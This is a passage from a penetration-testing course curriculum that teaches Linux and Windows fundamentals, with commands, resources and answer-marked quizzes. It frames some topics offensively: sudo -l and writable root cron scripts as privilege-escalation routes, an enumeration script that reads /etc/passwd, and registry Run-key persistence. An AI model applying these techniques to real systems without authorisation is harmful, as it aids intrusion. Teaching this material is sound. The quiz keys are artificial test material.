- A trailing & backgrounds a command immediately and prints its PID, e.g. `sleep 2000 &`
- Every process returns an exit code on completion; `$?` holds the most recent command's exit code — 0 conventionally means success, non-zero means failure, most commonly 1, though some failures return a specific error code identifying the exact failure mode
- top, htop, and btop provide a live, continuously-updating view of processes and resource usage; htop and btop both add friendlier, colour-coded, mouse-capable interfaces over the same data, with btop offering the most features of the three
- nohup keeps a background process running even after you log out of the shell session that started it

```bash
ps aux
ps -ef | grep sshd
kill <PID>
top
htop
btop
nohup long_command &
```

**Resources:**

- [ps(1) man page](https://man7.org/linux/man-pages/man1/ps.1.html) _(link)_
- [htop](https://htop.dev) _(tool)_

**Quick Quiz:**

1. What key piece of information does 'ps' primarily reveal about running processes?
   - **The PID (process ID) needed to inspect or kill a process** ✓
   - The MAC address of the process owner
   - The disk partition table
   - The DNS resolver configuration
   > ps lists running processes along with their PID, which you need to signal, inspect, or terminate them.
2. What does Ctrl+Z do to a running foreground process?
   - **Suspends it, allowing it to be resumed later with fg or bg** ✓
   - Immediately terminates it permanently
   - Restarts the process from the beginning
   - Sends it directly to a background daemon
   > Ctrl+Z suspends the process; fg resumes it in the foreground and bg resumes it running in the background.
3. What does appending & to a command do?
   - **Runs the command in the background immediately** ✓
   - Runs the command with elevated privileges
   - Pipes the command's output to another command
   - Schedules the command to run at boot
   > A trailing & backgrounds the command right away, returning control of the shell immediately.

#### 32. User & Group Management (adduser, passwd, sudo, su, groups, id) `[theory]` — Week 3

Every user has a username and one or more groups, which drive permission and access-control decisions system-wide. `whoami` shows just the current username; `id` shows the full picture — UID, primary GID, and every group the user belongs to. root is UID/GID 0 and has access to everything, which is exactly why day-to-day work uses `sudo` (run a single command as root) instead of logging in as root directly; `sudo -l` shows exactly what a user is permitted to run as root — a key privilege-escalation enumeration check. The `passwd` command manages user passwords — run alone it changes your own password, but supplying a username while running as root changes that user's password instead.

**Key Points:**

- root = UID/GID 0; sudo -l shows what a user is allowed to run as root (a key privesc check) — a NOPASSWD prefix means that command needs no password at all
- /etc/passwd stores 7 colon-separated fields per user: username, password placeholder (x), UID, GID, GECOS/user info, home dir, shell — the real password hashes live in root-only /etc/shadow
- The passwd command changes the current user's password by default; run as root with a username argument (`passwd [user]`), it changes that other user's password instead
- adduser (interactive, friendlier, sets up the home dir and prompts for details) vs useradd -m -s /bin/bash (low-level, scriptable, requires explicit flags)
- usermod -aG sudo user adds a user to the sudo group without removing their existing group memberships (omitting -a would replace their groups entirely)
- deluser/userdel remove accounts; adding --remove-home (deluser) or -r (userdel) also deletes their home directory
- usermod is also used to lock/unlock accounts (-L / -U), change shells (-s), or rename a login (-l)
- groupadd/groupdel create and remove groups; a single user can belong to multiple groups simultaneously

```bash
whoami
id
sudo -l
adduser newuser
usermod -aG sudo newuser
passwd newuser
groups newuser
```

**Resources:**

- [passwd(5) man page](https://man7.org/linux/man-pages/man5/passwd.5.html) _(link)_
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) _(link)_

**Quick Quiz:**

1. What is the UID/GID of the root user on Linux?
   - **0** ✓
   - 1
   - 100
   - 1000
   > root always has UID/GID 0, marking it as the superuser.
2. What does 'sudo -l' show and why does it matter for security testing?
   - **What commands the current user is allowed to run as root - a key privilege-escalation check** ✓
   - The list of all logged-in users
   - The full system command history
   - The contents of /etc/shadow directly
   > sudo -l lists the sudo permissions granted to the current user, which is one of the first things checked during privilege escalation.
3. Where are actual password hashes stored on a modern Linux system?
   - **/etc/shadow (root-only readable)** ✓
   - /etc/passwd (world-readable)
   - /etc/group
   - /home/user/.bashrc
   > Password hashes live in /etc/shadow, which is restricted to root, while /etc/passwd only stores non-sensitive user metadata.

#### 33. Starting & Stopping Services (systemctl, service) `[theory]` — Week 3

systemd (PID 1, the init process) replaced legacy SysV init scripts (which used rc files from /etc/rc.d) on modern distros — systemctl is how you check, start, stop, and persist services; stopping a service sends it a SIGTERM (signal 15) so it can terminate gracefully before being marked inactive. Critically, 'start' only runs a service for the current session; 'enable' is what makes it launch automatically on every future boot — conflating the two is a common misconfiguration worth checking for on any box you're assessing.

**Key Points:**

- systemctl status <service> shows Loaded/Active/Main PID and recent log lines at a glance, e.g. `systemctl status sshd` shows whether the SSH daemon is listening on port 22 — the output even cross-references relevant man pages such as `man:sshd(8)` and `man:sshd_config(5)`
- 'start' runs a service now only; 'enable' makes it persist across reboots — they are not the same, and running one without the other is a common misconfiguration
- systemd is a daemon (the 'd' suffix means a lightweight background process) — the first process started at boot
- systemctl stop sends SIGTERM (signal 15) to the service's process, giving it a chance to terminate gracefully before the unit is marked inactive
- The Samba service (`sudo apt-get install samba`) enables SMB/CIFS file and print sharing between Linux and Windows clients — it must be installed, enabled, and started as separate steps
- systemctl disable stops a service from auto-starting on future boots without stopping it right now

```bash
sudo systemctl status sshd
sudo systemctl stop sshd
sudo systemctl start sshd
sudo systemctl enable sshd
sudo apt-get install samba
sudo systemctl enable samba
sudo systemctl disable sshd
```

**Resources:**

- [systemd documentation](https://www.freedesktop.org/wiki/Software/systemd/) _(link)_
- [systemctl(1) man page](https://man7.org/linux/man-pages/man1/systemctl.1.html) _(link)_

**Quick Quiz:**

1. What is the difference between 'systemctl start' and 'systemctl enable'?
   - **start runs a service now only; enable makes it persist across reboots** ✓
   - They are functionally identical
   - enable runs it now only; start makes it persist
   - start disables the service permanently
   > start activates a service immediately for the current session, while enable configures it to also start automatically on future boots.
2. Which command shows a service's Loaded/Active/Main PID status?
   - **systemctl status <service>** ✓
   - systemctl list-units
   - ps aux
   - top
   > systemctl status gives an at-a-glance summary including Loaded, Active state, and the Main PID of a service.
3. What replaced legacy SysV init on most modern Linux distros?
   - **systemd** ✓
   - cron
   - GRUB
   - apt
   > systemd (running as PID 1) replaced legacy SysV init scripts and runlevels on modern distros.

#### 34. Network Commands (ifconfig/ip, netstat, ss, tcpdump, iptables) `[theory]` — Week 3

The commands that show you what a Linux box can see and reach on the network — interface config, active connections, live packet capture, and firewall rules. `ip a` (modern) has replaced the legacy `ifconfig`/`iwconfig` pair for showing interfaces and assigned IPs, though the old tools still show up often enough to recognise: `lo` is the loopback adapter used for local troubleshooting, and wired/wireless adapters — typically named things like enp3s0 (ethernet) and wlp4s0 (wireless) — each show their own inet (IPv4) and inet6 (IPv6) addresses.

**Key Points:**

- ip a (modern) has replaced ifconfig (legacy, wired) and iwconfig (legacy, wireless) for showing interfaces and assigned IPs — lo is the loopback interface used for local troubleshooting
- netstat stands for Network Statistics; a socket — what netstat reports on — is a file that lets two processes communicate, either locally or over a network
- netstat -a lists all listening sockets (TCP+UDP); -t for TCP only, -u for UDP only, -l for listening only; ss has since replaced netstat but both still appear in the field
- tcpdump -D (or --list-interfaces) lists available capture interfaces; -i any captures on all of them, -c <n> limits the capture to n packets, and -w saves to a .pcap file for later Wireshark analysis
- tcpdump resolves IPs/ports to names by default — use -n to disable IP resolution and -nn to also disable port resolution when you want raw addresses for troubleshooting
- tcpdump's TCP packet output follows the general format: [timestamp] [interface] [link type] [network layer protocol] [source ip:port] [destination ip:port] [TCP flags] [sequence number] [ack number] [window size] [length]
- iptables filters traffic via Tables (group similar rules), Chains (ordered rule lists), Rules (match conditions), and Targets (ACCEPT/DROP/REJECT decision)
- `iptables -A INPUT -p tcp --dport 22 -j ACCEPT` is the canonical example of allowing inbound SSH traffic through the firewall

```bash
ip a
netstat -tulpn
ss -tulpn
sudo tcpdump -i any -c 1000 -w capture.pcap
iptables -L
iwconfig
tcpdump -D
sudo tcpdump -i any -n -nn
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

**Resources:**

- [ss(8) man page](https://man7.org/linux/man-pages/man8/ss.8.html) _(link)_
- [tcpdump official site](https://www.tcpdump.org) _(tool)_
- [Wireshark](https://www.wireshark.org) _(tool)_

**Quick Quiz:**

1. Which modern command has replaced the legacy 'ifconfig' for showing interfaces and IPs?
   - **ip a** ✓
   - netstat
   - arp -a
   - ss -a
   > ip a is the modern replacement for the legacy ifconfig command for viewing network interfaces and assigned IPs.
2. Which tool captures live network traffic and can save it to a .pcap file with -w?
   - **tcpdump** ✓
   - iptables
   - ss
   - ip
   > tcpdump captures live packets and the -w flag writes them to a .pcap file for later analysis, e.g. in Wireshark.
3. What do 'netstat -tulpn' / 'ss -tulpn' primarily show?
   - **Listening ports and established connections** ✓
   - The filesystem's mounted partitions
   - The system's installed packages
   - The list of local user accounts
   > Both commands list listening TCP/UDP ports and active connections along with the owning process.

#### 35. Package Management (apt, apt-get, dpkg, yum/dnf) `[theory]` — Week 3

Debian-based distros (Kali, Ubuntu, Mint) use APT/dpkg; Red Hat-based distros use YUM/DNF — knowing both lets you install tools on any target you're given lab access to. Package hygiene matters too: over time cached package files and orphaned dependencies accumulate and waste disk space, which is what `apt-get clean` and `apt-get autoremove` are for.

**Key Points:**

- apt update refreshes the package index; apt upgrade installs newer versions of installed packages
- apt install <pkg> installs a new tool; dpkg -i installs a local .deb file directly
- yum/dnf are the RPM-based equivalents on CentOS/Fedora/RHEL
- apt-get clean clears the downloaded package cache; apt-get autoremove removes packages that were installed only as dependencies and are no longer needed by anything

```bash
sudo apt update && sudo apt upgrade
sudo apt install nmap
sudo dpkg -i package.deb
sudo dnf install nmap
sudo apt-get clean
sudo apt-get autoremove
```

**Resources:**

- [Debian APT wiki](https://wiki.debian.org/Apt) _(link)_
- [dpkg(1) man page](https://man7.org/linux/man-pages/man1/dpkg.1.html) _(link)_

**Quick Quiz:**

1. Which command refreshes the local package index on a Debian-based system without upgrading anything yet?
   - **apt update** ✓
   - apt upgrade
   - apt install
   - apt autoremove
   > apt update refreshes the package index metadata; apt upgrade is the separate step that actually installs newer package versions.
2. Which package manager family is used on CentOS/Fedora/RHEL instead of APT?
   - **YUM/DNF** ✓
   - dpkg
   - Homebrew
   - pip
   > YUM and its successor DNF are the RPM-based package managers used on Red Hat-derived distros.
3. Which command installs a local .deb package file directly?
   - **sudo dpkg -i package.deb** ✓
   - sudo apt update
   - sudo yum install package.deb
   - sudo dnf update
   > dpkg -i installs a .deb package file directly from disk, unlike apt which fetches from a repository.

#### 36. SSH & Remote Access (ssh, scp, ssh-keygen) `[theory]` — Week 3

SSH provides secure, encrypted remote access to servers — system administrators (and pentesters, post-exploitation) use it to remotely manage or pivot through machines.

**Key Points:**

- Password auth vs key-based auth (ssh-keygen generates a keypair; public key goes in ~/.ssh/authorized_keys)
- scp copies files securely over SSH, using the same syntax style as cp but with a host prefix
- SSH is the standard target for Hydra/Medusa brute-force testing labs later in the course

```bash
ssh user@10.10.10.5
ssh-keygen -t ed25519
scp file.txt user@10.10.10.5:/tmp/
```

**Resources:**

- [OpenSSH official manual](https://www.openssh.com/manual.html) _(link)_
- [ssh(1) man page](https://man7.org/linux/man-pages/man1/ssh.1.html) _(link)_

**Quick Quiz:**

1. What command generates a new SSH keypair for key-based authentication?
   - **ssh-keygen** ✓
   - scp
   - ssh
   - sudo
   > ssh-keygen generates a public/private keypair, e.g. ssh-keygen -t ed25519, used for key-based SSH authentication.
2. Where must a generated public key be placed for key-based SSH login to work?
   - **~/.ssh/authorized_keys on the remote host** ✓
   - /etc/passwd on the local host
   - /etc/shadow on the remote host
   - ~/.ssh/id_rsa on the local host only
   > The public key must be appended to ~/.ssh/authorized_keys on the remote host the user wants to log into.
3. Which command securely copies a file to a remote host over SSH?
   - **scp file.txt user@host:/path/** ✓
   - cp file.txt user@host:/path/
   - mv file.txt user@host:/path/
   - ftp file.txt user@host:/path/
   > scp uses the SSH protocol to securely copy files to or from a remote host, using cp-like syntax with a host prefix.

#### 37. Cron Jobs & Task Automation (crontab -e) `[theory]` — Week 3

Cron schedules commands to run automatically at fixed times/intervals — and a world-writable cron script run as root is a classic Linux privilege-escalation path covered again in M11.

**Key Points:**

- Crontab format: minute hour day month weekday command
- System-wide jobs live in /etc/crontab and /etc/cron.d/; user jobs via crontab -e
- Privesc angle: if a root cron job calls a script writable by your user, you can hijack it

```bash
crontab -e
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
```

**Resources:**

- [crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html) _(link)_
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) _(link)_

**Quick Quiz:**

1. What is the correct field order in a standard crontab entry?
   - **minute hour day month weekday command** ✓
   - hour minute day month weekday command
   - command minute hour day month weekday
   - weekday month day hour minute command
   > Crontab entries follow the format: minute hour day month weekday, followed by the command to run.
2. Why is a world-writable script called by a root cron job a privilege-escalation risk?
   - **A lower-privileged user could modify the script's contents and have it executed as root** ✓
   - Cron jobs never run with root privileges regardless of configuration
   - World-writable files cannot be executed by cron
   - Crontab entries are always read-only
   > If an unprivileged user can write to a script that a root cron job executes, they can inject commands that then run with root privileges.
3. Which command lists the current user's own crontab entries?
   - **crontab -l** ✓
   - crontab -e
   - cat /etc/cron.d/
   - ls /var/spool/cron
   > crontab -l lists the current user's scheduled jobs, while crontab -e opens them for editing.

#### 38. OverTheWire: Bandit Levels 0-10 `[lab]` — Week 3

A wargame that teaches Linux/SSH fundamentals level by level — each level is an SSH login that hides the password for the next level somewhere on the filesystem. Solving it forces you to actually combine core commands rather than just recognise them individually: quoting/escaping filenames with spaces or leading dashes, listing hidden dotfiles with `ls -la`, filtering by size/owner/group with `find`, identifying the one human-readable file among many with `file`, and decoding encoded data with `base64 -d`.

**Key Points:**

- Level 0: connect via SSH with the credentials given on the Bandit site
- Each level requires combining a new command/concept (quoting, hidden files, `find` by size/owner/group, `file` type detection, `base64 -d` decoding, permissions) with what you already know to locate the next password
- Bare dashes and filenames with spaces need explicit handling — e.g. `cat ./-` for a file literally named '-', or quotes/backslashes for names containing spaces
- `find / -size <n>c -user <owner> -group <group> 2>/dev/null` is the general pattern for locating a specific file across the whole filesystem by its attributes
- Submit a screenshot of the Level 10 flag/password as proof of completion

```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
```

**Resources:**

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/) _(platform)_
- [explainshell.com](https://explainshell.com) _(tool)_

**Quick Quiz:**

1. What is the fundamental format of each Bandit level's challenge?
   - **An SSH login where the next level's password is hidden somewhere on the filesystem** ✓
   - A web form requiring a CAPTCHA to solve
   - A local GUI application to reverse engineer
   - A physical hardware challenge
   > Each Bandit level is accessed via SSH, and the goal is to find the next level's password hidden on that level's filesystem.
2. What skill category does OverTheWire Bandit primarily build?
   - **Core Linux/SSH command-line fundamentals** ✓
   - Advanced binary exploitation
   - Active Directory attacks
   - Web application scanning
   > Bandit is designed to teach foundational Linux and SSH command-line skills level by level.
3. What is required as proof of completing through Level 10 in this exercise?
   - **A screenshot of the Level 10 flag/password** ✓
   - A compiled exploit binary
   - A Wireshark capture file
   - A completed subnet calculation
   > The lab explicitly asks for a screenshot of the Level 10 flag/password as evidence of completion.

#### 39. Bash Script: Enumerate users & running processes `[lab]` — Week 3

Write a Bash script that automatically enumerates local users, running processes, and listening ports — a mini version of the enumeration scripts used in real post-exploitation. Every script should start with a shebang line (`#!/bin/bash`) to tell the system which interpreter to run it with, and must be made executable with `chmod +x` before it can be run directly as `./script.sh`.

**Key Points:**

- Start every script with a shebang line #!/bin/bash so the system knows which interpreter to run it with
- Read /etc/passwd to list local users and their shells: `cut -d: -f1 /etc/passwd`
- Use ps aux to capture running processes and ss -tulpn (or netstat) to capture listening ports
- Make the script executable with `chmod +x` before running it directly
- Use echo "== Section ==" headers between blocks so the report reads clearly instead of as one raw dump
- Write all output to a timestamped report file with tee so you get both a live view and a saved copy
- Conditional logic (if/then, comparisons) and loops (for, while) let a script react to values it reads — e.g. checking disk usage against a threshold with `df / | tail -1 | awk '{print $5}' | sed 's/%//'`

```bash
#!/bin/bash
echo "== Users ==" ; cut -d: -f1 /etc/passwd
echo "== Processes ==" ; ps aux
echo "== Listening Ports ==" ; ss -tulpn
chmod +x enum.sh
./enum.sh | tee enum_report_$(date +%F).txt
```

**Resources:**

- [Bash scripting cheat sheet (devhints.io)](https://devhints.io/bash) _(link)_
- [explainshell.com](https://explainshell.com) _(tool)_

**Quick Quiz:**

1. Which command is used in the script to list local usernames from /etc/passwd?
   - **cut -d: -f1 /etc/passwd** ✓
   - ps aux
   - ss -tulpn
   - crontab -l
   > cut -d: -f1 splits each /etc/passwd line on ':' and prints the first field, the username.
2. Which command captures currently listening ports for the script's report?
   - **ss -tulpn** ✓
   - cut -d: -f1 /etc/passwd
   - chmod 700
   - man -k network
   > ss -tulpn (or netstat -tulpn) lists listening TCP/UDP ports along with the owning process.
3. Why does the script pipe its output through tee?
   - **To save a timestamped report file while still printing output to the screen** ✓
   - To immediately delete the output after displaying it
   - To encrypt the output before saving
   - To send the output over the network automatically
   > tee writes the script's output to both the terminal and a saved report file simultaneously.


---

## M3: OS Basics - Windows

**Month 1** · Week 4 · 14 topics

Most corporate environments you'll test run Windows and Active Directory. This module covers the architecture, permission model, and command-line tools (CMD/PowerShell) needed to operate confidently on a Windows box — critical groundwork for AD attacks and Windows privesc later.

**Learning Outcomes:**

- Explain User Mode vs Kernel Mode and why it matters for stability/security
- Manage files, permissions (ACL/icacls), users, and groups from CMD/PowerShell
- Manage Windows processes and services from the command line
- Configure and query Windows Defender and Windows Firewall via CLI
- Investigate a Windows Event Log for indicators of compromise

**Module Resources:**

- [TryHackMe Windows Fundamentals](https://tryhackme.com) _(platform)_
- [Microsoft Docs](https://learn.microsoft.com) _(link)_
- [SS64.com CMD/PowerShell reference](https://ss64.com) _(link)_

**Module Quiz (10 questions):**

1. Which privilege ring does Kernel Mode run in, and what typically happens if it crashes?
   - **Ring 0; a kernel crash typically causes a BSOD** ✓
   - Ring 3; a kernel crash silently restarts one app
   - Ring 1; a kernel crash only affects networking
   - Ring 2; a kernel crash requires no reboot
   > Kernel Mode runs at Ring 0 with full hardware access, so a crash there can bring down the whole system as a BSOD.
2. Which command-line tool edits ACL permissions on NTFS files, and what wins when NTFS and share permissions conflict?
   - **icacls; the most restrictive permission wins** ✓
   - chmod; the least restrictive permission wins
   - regedit; NTFS always wins regardless
   - net user; the share permission always wins
   > icacls manages NTFS ACLs from the command line, and when NTFS and share permissions differ, the more restrictive of the two applies.
3. Which registry hive holds system-wide settings, and which sub-path is a classic persistence mechanism?
   - **HKEY_LOCAL_MACHINE; the ...\Run keys** ✓
   - HKEY_CURRENT_USER only; HKEY_CLASSES_ROOT\Run
   - HKEY_USERS; HKLM\Boot
   - HKEY_CLASSES_ROOT; HKCU\Software\Explorer
   > HKLM stores system-wide configuration, and the Run keys under HKLM/HKCU auto-launch programs at login, a common persistence mechanism.
4. What does UAC do, and which command adds a user to the local administrators group?
   - **Prompts for consent before privileged actions; net localgroup administrators user /add** ✓
   - Blocks all admin actions permanently; net user administrators /add
   - Grants admin silently; icacls administrators /add
   - Disables Group Policy; net group administrators /add
   > UAC prompts for consent/credentials before elevated actions, and net localgroup administrators <user> /add adds a user to the local admins group.
5. Which Event IDs correspond to successful and failed logons respectively?
   - **4624 (success) and 4625 (failure)** ✓
   - 4625 (success) and 4624 (failure)
   - 1074 (success) and 1033 (failure)
   - 4657 (success) and 1074 (failure)
   > Event ID 4624 logs successful logons, while 4625 logs failed logon attempts, together enabling brute-force detection.
6. What hardware component does BitLocker rely on to bind the encryption key to specific hardware?
   - **TPM (Trusted Platform Module)** ✓
   - the GPU
   - the CMOS battery
   - the network adapter's MAC address
   > BitLocker seals its encryption key to the TPM, ensuring the key is tied to that specific machine's hardware.
7. Which taskkill flags force-kill a process along with its child processes?
   - **/F /T /IM** ✓
   - /S /Q
   - /X /Y
   - /A /L
   > /F forces termination, /T also terminates the process's child tree, and /IM specifies the target image name.
8. What does PowerShell's Invoke-Expression do, and why is it notable to defenders?
   - **It executes a string as code, a common living-off-the-land technique attackers abuse** ✓
   - It only shows cmdlet help text, harmless from a security perspective
   - It permanently locks the execution policy to Restricted
   - It only works when run remotely via RDP
   > Invoke-Expression runs arbitrary text as PowerShell code, making it a favoured living-off-the-land technique for attackers.
9. Which command shows a Windows service's RUNNING/STOPPED state from CMD, and which PowerShell cmdlet does the equivalent?
   - **sc query; Get-Service** ✓
   - tasklist; Get-Process
   - icacls; Get-Acl
   - wmic; Get-WmiObject only
   > sc query reports a service's state from CMD, and Get-Service is the PowerShell cmdlet that reports the same information.
10. Which netsh command adds a new inbound firewall rule, and which PowerShell cmdlet lists existing firewall rules?
   - **netsh advfirewall firewall add rule ...; Get-NetFirewallRule** ✓
   - netsh advfirewall show allprofiles; Get-MpComputerStatus
   - MpCmdRun.exe; Get-Service
   - manage-bde; Get-LocalUser
   > netsh advfirewall firewall add rule creates a new rule, and Get-NetFirewallRule is the PowerShell cmdlet for listing configured firewall rules.

### Topics

#### 40. Windows Versions & Architecture (User Mode vs Kernel Mode) `[theory]` — Week 4

The CPU enforces two privilege levels via its protection rings: User Mode (Ring 3) and Kernel Mode (Ring 0). User Mode is a restricted execution environment with no direct access to hardware or critical memory — applications (e.g. Chrome, Notepad) call Windows API functions that internally issue system calls, transitioning into Kernel Mode via software interrupts or, on x64 systems, the syscall instruction. Each User Mode process gets its own virtual address space, so an app crash only affects itself; Kernel Mode runs the Windows Kernel, Executive subsystems (memory manager, I/O manager, object manager), the HAL, and device drivers with full hardware/memory access — a crash here takes down the whole system (BSOD). In layman's terms: User Mode is a building's lobby, open to the public but restricted; Kernel Mode is the control room, where only trusted staff control the lights, power, and elevators. Windows then ships in editions targeted at different users on top of this same architecture: Pro for small businesses/IT pros/power users, Enterprise for medium-to-large organizations needing centralized management, and Server for data centers and back-end infrastructure.

**Key Points:**

- User Mode (Ring 3): restricted, no direct hardware/memory access — apps use Windows API calls/system calls to reach Kernel Mode, and each process gets its own virtual address space so a crash only affects itself
- Kernel Mode (Ring 0): full hardware/memory access, runs the Windows Kernel, Executive subsystems (memory manager, I/O manager, object manager), and device drivers; a kernel crash = BSOD affecting the entire system
- The User Mode -> Kernel Mode transition happens when an API call issues a system call, using software interrupts or, on x64 systems, the syscall instruction
- Analogy: User Mode is a building's lobby — open but restricted; Kernel Mode is the control room, where only trusted staff control the lights, power, and elevators
- Examples: applications (Chrome, Notepad) and CSRSS run in User Mode; the Kernel, Executive, HAL, and device drivers run in Kernel Mode
- Windows 10/11 Pro (target: small businesses, IT professionals, power users) adds BitLocker, RDP host access, Group Policy Management, Hyper-V, Assigned Access/Kiosk mode, and Windows Update for Business
- Windows 10/11 Enterprise (target: medium-to-large enterprises) builds on everything in Pro plus Defender ATP, AppLocker, Credential Guard & Device Guard, Intune integration, LTSC, advanced Group Policy, and enhanced Microsoft 365 analytics
- Windows Server (e.g. 2016/2019/2022; target: data centers, back-end infrastructure) is not for end-user desktops — it runs AD DS, DNS/DHCP Server, File and Print Services, RDS, Hyper-V Server/Virtualization Host, IIS, and Domain Controller roles

**Resources:**

- [Microsoft Learn: Windows editions](https://learn.microsoft.com/windows/whats-new/windows-editions) _(link)_
- [Microsoft Learn: User Mode and Kernel Mode](https://learn.microsoft.com/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode) _(link)_

**Quick Quiz:**

1. Which CPU privilege ring does Kernel Mode correspond to?
   - **Ring 0** ✓
   - Ring 3
   - Ring 1
   - Ring 2
   > Kernel Mode runs at Ring 0, the most privileged level, giving direct hardware/memory access, while User Mode runs at Ring 3.
2. What typically happens when a crash occurs in Kernel Mode?
   - **A BSOD (Blue Screen of Death), since kernel code has direct hardware/memory access** ✓
   - The affected app silently restarts with no visible impact
   - Only that single application closes, leaving the OS unaffected
   - The GPU takes over kernel duties automatically
   > Because Kernel Mode code runs with full hardware/memory access, a crash there can bring down the whole system, resulting in a BSOD.
3. Which Windows edition specifically adds AD DS, DNS/DHCP, IIS, and Domain Controller roles?
   - **Windows Server** ✓
   - Windows 10/11 Home
   - Windows 10/11 Pro
   - Windows 11 Enterprise only
   > Windows Server editions add Active Directory Domain Services, DNS/DHCP, IIS, and Domain Controller roles, which are not meant for end-user desktop editions.

#### 41. File Navigation & Management (Explorer, CMD: cd, dir, copy, del, icacls) `[theory]` — Week 4

The CLI gives more control, speed, and is essential for scripting and remote work compared to File Explorer. Windows uses Access Control Lists (ACLs) to control who can read, write, or execute a file — icacls inspects and modifies those permissions directly from the command line, including resetting them back to inherited defaults or applying a change recursively across an entire folder tree.

**Key Points:**

- cd changes directory; dir lists a directory's contents, and dir /a additionally shows hidden files
- copy duplicates a file (e.g. copy file.txt D:\Backup\file.txt); move relocates or renames it (e.g. move data.csv C:\Archive\data.csv)
- del deletes files; mkdir creates a new directory; rmdir /s /q removes a folder and its contents quietly (/s = with subfolders, /q = quiet mode)
- Windows uses ACLs to control who can read, write, or execute a file or folder — icacls is the CLI tool for inspecting and modifying that access
- icacls filename.txt views a file's ACL permissions; icacls filename.txt /grant UserName:F grants a user full control
- icacls filename.txt /reset restores a file/folder's permissions back to their inherited defaults
- icacls C:\MyFolder /grant UserName:(OI)(CI)F /T applies a grant recursively — (OI) Object Inherit for files, (CI) Container Inherit for folders, /T to traverse subfolders

```bash
cd C:\Users\Admin\Documents
dir /a
copy file.txt D:\Backup\file.txt
move data.csv C:\Archive\data.csv
del old_report.txt
mkdir NewFolder
rmdir /s /q UnusedFolder
icacls filename.txt
icacls filename.txt /grant UserName:F
icacls filename.txt /reset
icacls C:\MyFolder /grant UserName:(OI)(CI)F /T
```

**Resources:**

- [SS64 CMD reference](https://ss64.com/nt/) _(link)_
- [Microsoft Learn: icacls](https://learn.microsoft.com/windows-server/administration/windows-commands/icacls) _(link)_

**Quick Quiz:**

1. Which command shows hidden files in CMD?
   - **dir /a** ✓
   - dir /h
   - ls -la
   - cd /a
   > dir /a lists all files including hidden and system files, unlike a plain dir.
2. Which command removes a folder and its contents quietly without prompting?
   - **rmdir /s /q** ✓
   - del /s
   - rmdir
   - rm -rf
   > rmdir /s /q removes a directory and everything in it recursively (/s) and quietly without confirmation prompts (/q).
3. Which command lets you view or edit ACL permissions on a file directly from CMD?
   - **icacls** ✓
   - dir /a
   - copy
   - move
   > icacls displays and edits the access control list of a file or folder from the command line.

#### 42. NTFS File System & Permissions `[theory]` — Week 4

NTFS is the modern Windows filesystem, supporting per-file/folder ACLs, encryption (EFS), compression, and journaling for crash recovery.

**Key Points:**

- NTFS permissions stack with share permissions — the most restrictive of the two wins
- Supports Alternate Data Streams (ADS) — a technique sometimes abused to hide data/malware
- Journaling logs changes before committing them, protecting against corruption on crash

**Resources:**

- [Microsoft Learn: NTFS overview](https://learn.microsoft.com/windows-server/storage/file-server/ntfs-overview) _(link)_
- [SS64.com reference](https://ss64.com) _(link)_

**Quick Quiz:**

1. When NTFS and share permissions both apply to the same resource, which wins?
   - **The most restrictive of the two** ✓
   - The share permission always wins
   - The NTFS permission always wins
   - Whichever was set most recently
   > NTFS and share permissions stack, and the effective access is determined by whichever of the two is more restrictive.
2. What NTFS technique is sometimes abused to hide data or malware?
   - **Alternate Data Streams (ADS)** ✓
   - FAT32 partition spanning
   - MBR boot sector hiding
   - ext4 journaling
   > NTFS supports Alternate Data Streams, which can attach hidden data to a file and are sometimes abused for concealment.
3. What does NTFS journaling protect against?
   - **Data corruption on a crash, by logging changes before committing them** ✓
   - Unauthorised user logins
   - Malware execution
   - Network packet loss
   > Journaling records intended changes before committing them, allowing recovery to a consistent state after a crash.

#### 43. Windows Registry (regedit, structure, common keys) `[theory]` — Week 4

A hierarchical database storing low-level OS and application configuration — a favourite target for both legitimate admin and malware persistence. In one real training incident, an employee ran a malicious installer (Totally_Legit_Software.msi) that silently modified the HKCU\...\Run registry key to launch a shutdown command on every login; the modification itself was only visible by auditing Event ID 4657 (registry key modification) in Event Viewer, and the resulting forced shutdowns showed up as Event ID 1074 — a textbook example of why the Run key is one of the first places defenders and attackers alike look.

**Key Points:**

- Root hives: HKEY_LOCAL_MACHINE (system-wide), HKEY_CURRENT_USER (per-user), HKEY_CLASSES_ROOT, HKEY_USERS
- HKLM\...\Run and HKCU\...\Run keys auto-launch programs at login — a common persistence/malware mechanism
- Real incident pattern: a malicious .msi installer modified HKCU\...\Run to add a shutdown command, forcing the machine to shut down on every subsequent login
- Registry key modifications are only visible in Event Viewer if object-access auditing is enabled — logged under Event ID 4657
- regedit provides a GUI; reg query/reg add work from CMD/scripts for automation or forensic scripting

```bash
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Resources:**

- [Microsoft Learn: Windows Registry](https://learn.microsoft.com/windows/win32/sysinfo/registry) _(link)_
- [SS64: reg command reference](https://ss64.com/nt/reg.html) _(link)_

**Quick Quiz:**

1. Which registry hive stores system-wide configuration?
   - **HKEY_LOCAL_MACHINE** ✓
   - HKEY_CURRENT_USER
   - HKEY_CLASSES_ROOT
   - HKEY_USERS
   > HKEY_LOCAL_MACHINE (HKLM) stores system-wide settings, while HKEY_CURRENT_USER (HKCU) stores per-user configuration.
2. Which registry key location is a common auto-launch/persistence mechanism abused by malware?
   - **HKLM/HKCU ...\Run keys** ✓
   - HKEY_CLASSES_ROOT\Explorer
   - HKEY_USERS\Default\Shell
   - HKLM\SYSTEM\Boot
   > Programs listed under the Run keys in HKLM or HKCU are automatically launched at login, a mechanism frequently abused for persistence.
3. Which command-line tool lets you query registry values directly from CMD or scripts?
   - **reg query** ✓
   - regedit (GUI only)
   - icacls
   - wmic query
   > reg query reads registry values from the command line or scripts, while regedit is the GUI equivalent.

#### 44. User & Group Management (net user, whoami, UAC, Group Policy) `[theory]` — Week 4

Managing users and groups is critical for access control, privilege delegation, and securing a Windows system — especially in enterprise and penetration-testing environments. net user views/adds/modifies/deletes local accounts, net localgroup manages group membership, whoami identifies the current session's identity and privileges, and wmic useraccount enumerates accounts and their SIDs for scripting and privilege analysis.

